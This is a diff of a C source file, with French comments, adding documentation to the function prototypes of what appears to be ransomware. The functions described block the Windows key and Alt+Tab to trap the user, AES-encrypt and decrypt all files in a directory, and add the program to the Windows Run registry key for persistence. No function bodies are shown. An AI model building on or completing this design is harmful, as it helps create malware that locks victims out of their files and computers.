@@ -16,11 +16,68 @@ HWND hSubmitButton = NULL; // Bouton "Valider"
 
 
 // Prototypes
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
-void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
-int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
-void add_to_startup(const char *exe_path);
+
+/**
+ * @brief Callback pour intercepter les événements clavier.
+ * 
+ * Cette fonction est appelée par le système à chaque événement clavier. Elle bloque certaines touches
+ * comme la touche Windows, Alt+Tab, etc., pour empêcher l'utilisateur de quitter l'application.
+ * 
+ * @param nCode Code d'action (HC_ACTION ou HC_NOREMOVE).
+ * @param wParam Type de message (WM_KEYDOWN, WM_KEYUP, etc.).
+ * @param lParam Pointeur vers une structure KBDLLHOOKSTRUCT contenant les détails de l'événement.
+ * @return LRESULT 1 pour bloquer l'événement, CallNextHookEx pour le transmettre.
+ */
+ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+ /**
+  * @brief Callback pour gérer les messages de la fenêtre.
+  * 
+  * Cette fonction est appelée par le système pour gérer les messages de la fenêtre, comme la création,
+  * la peinture, les commandes (boutons), etc.
+  * 
+  * @param hwnd Handle de la fenêtre.
+  * @param uMsg Message reçu (WM_CREATE, WM_PAINT, WM_COMMAND, etc.).
+  * @param wParam Paramètre supplémentaire du message.
+  * @param lParam Paramètre supplémentaire du message.
+  * @return LRESULT Résultat du traitement du message.
+  */
+ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+ 
+ /**
+  * @brief Chiffre les fichiers dans un répertoire donné.
+  * 
+  * Cette fonction parcourt le répertoire spécifié et chiffre tous les fichiers qu'il contient
+  * en utilisant l'algorithme AES avec la clé et l'IV fournis.
+  * 
+  * @param directory Chemin du répertoire à chiffrer.
+  * @param key Clé AES de 256 bits pour le chiffrement.
+  * @param iv Vecteur d'initialisation AES de 128 bits.
+  */
+ void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
+ 
+ /**
+  * @brief Déchiffre les fichiers dans un répertoire donné.
+  * 
+  * Cette fonction parcourt le répertoire spécifié et déchiffre tous les fichiers qu'il contient
+  * en utilisant l'algorithme AES avec la clé et l'IV fournis.
+  * 
+  * @param directory Chemin du répertoire à déchiffrer.
+  * @param key Clé AES de 256 bits pour le déchiffrement.
+  * @param iv Vecteur d'initialisation AES de 128 bits.
+  * @return int 0 si le déchiffrement réussit, -1 en cas d'erreur.
+  */
+ int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
+ 
+ /**
+  * @brief Ajoute l'application au démarrage de Windows.
+  * 
+  * Cette fonction ajoute le chemin de l'exécutable actuel à la clé de registre "Run" de Windows,
+  * afin que l'application démarre automatiquement au démarrage de l'ordinateur.
+  * 
+  * @param exe_path Chemin complet de l'exécutable à ajouter au démarrage.
+  */
+ void add_to_startup(const char *exe_path);
 
 // Fonction principale
 int main() {
